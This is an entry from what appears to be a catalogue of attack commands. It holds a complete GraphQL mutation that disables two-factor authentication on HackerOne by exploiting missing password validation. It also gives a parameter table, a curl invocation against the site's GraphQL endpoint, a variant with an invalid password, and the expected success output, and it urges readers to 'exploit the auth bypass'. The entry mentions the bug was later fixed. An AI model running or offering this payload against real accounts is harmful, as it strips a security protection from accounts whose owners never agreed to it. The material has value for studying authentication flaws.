---
id: cmd-2fa-destroy-mutation
data: >-
  {"query":"mutation
  Destroy_two_factor_authentication_credentials_mutation($input_0:DestroyTwoFactorAuthenticationCredentialsInput!,$first_1:Int!,$throttle_time_2:Int!,$first_4:Int!,$size_3:ProfilePictureSizes!)
  {destroyTwoFactorAuthenticationCredentials(input:$input_0)
  {clientMutationId,...F1,...F2}} fragment F0 on User
  {id,totp_supported,totp_enabled,remaining_otp_backup_code_count,account_recovery_phone_number,username,name,_profile_picturePkPpF:profile_picture(size:$size_3)}
  fragment F1 on DestroyTwoFactorAuthenticationCredentialsPayload {me
  {id,user_type,_program_health_acknowledgements2aGZgn:program_health_acknowledgements(first:$first_1,throttle_time:$throttle_time_2)
  {edges {node {id,reason,team_member {user {id},id,team
  {handle,name,sla_failed_count,id}}},cursor},pageInfo
  {hasNextPage,hasPreviousPage}},new_feature_notification
  {name,description,url,id},...F0}} fragment F2 on
  DestroyTwoFactorAuthenticationCredentialsPayload {me
  {totp_enabled,remaining_otp_backup_code_count,id},was_successful,_errors3exXYb:errors(first:$first_4)
  {edges {node {type,field,message,id},cursor},pageInfo
  {hasNextPage,hasPreviousPage}}}","variables":{"input_0":{"password":"wrongpass","otp_code":"123456","clientMutationId":"9"},"first_1":1,"throttle_time_2":3600,"first_4":100,"size_3":"small"}}
tags:
  - graphql
  - auth-bypass
type: command
output: null
executor: graphql
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:48.411Z'
verified: false
validated: true
submitted: true
---
# destroy-two-factor-auth-mutation

## Command

```json
{"query":"mutation Destroy_two_factor_authentication_credentials_mutation($input_0:DestroyTwoFactorAuthenticationCredentialsInput!,$first_1:Int!,$throttle_time_2:Int!,$first_4:Int!,$size_3:ProfilePictureSizes!) {destroyTwoFactorAuthenticationCredentials(input:$input_0) {clientMutationId,...F1,...F2}} fragment F0 on User {id,totp_supported,totp_enabled,remaining_otp_backup_code_count,account_recovery_phone_number,username,name,_profile_picturePkPpF:profile_picture(size:$size_3)} fragment F1 on DestroyTwoFactorAuthenticationCredentialsPayload {me {id,user_type,_program_health_acknowledgements2aGZgn:program_health_acknowledgements(first:$first_1,throttle_time:$throttle_time_2) {edges {node {id,reason,team_member {user {id},id,team {handle,name,sla_failed_count,id}}},cursor},pageInfo {hasNextPage,hasPreviousPage}},new_feature_notification {name,description,url,id},...F0}} fragment F2 on DestroyTwoFactorAuthenticationCredentialsPayload {me {totp_enabled,remaining_otp_backup_code_count,id},was_successful,_errors3exXYb:errors(first:$first_4) {edges {node {type,field,message,id},cursor},pageInfo {hasNextPage,hasPreviousPage}}}","variables":{"input_0":{"password":"wrongpass","otp_code":"123456","clientMutationId":"9"},"first_1":1,"throttle_time_2":3600,"first_4":100,"size_3":"small"}}
```

## Description

This GraphQL mutation destroys two-factor authentication credentials on HackerOne by submitting an input object with an OTP code (backup code) and password. Due to the vulnerability, the password is not validated, allowing disablement with an invalid value as long as the backup code is correct. Use this in authenticated sessions via browser dev tools or API clients to exploit the auth bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| input_0.password | Password for verification (ignored in vulnerable state) | Yes |
| input_0.otp_code | Valid backup code for 2FA disable | Yes |
| input_0.clientMutationId | Unique ID for the mutation (e.g., '9') | Yes |
| first_1 | Pagination for program health acknowledgements (1) | Yes |
| throttle_time_2 | Throttling interval in seconds (3600) | Yes |
| first_4 | Pagination for errors (100) | Yes |
| size_3 | Profile picture size ('small') | Yes |

## Examples

### Basic Usage

Submit via GraphQL endpoint (e.g., using curl or browser):

```bash
curl -X POST -H "Content-Type: application/json" -d '{"query":"...","variables":{...}}' https://hackerone.com/graphql
```

### Advanced Usage

Modify otp_code to a valid backup and password to invalid for testing:

```json
{"variables":{"input_0":{"password":"invalid","otp_code":"valid_backup","clientMutationId":"10"}}}
```

## Expected Output

JSON response with was_successful: true, totp_enabled: false, and remaining_otp_backup_code_count decreased. No errors on password field pre-fix; post-fix, errors on invalid password.

## Related

- [[procedures/Disable-2FA-Without-Password-Verification]]
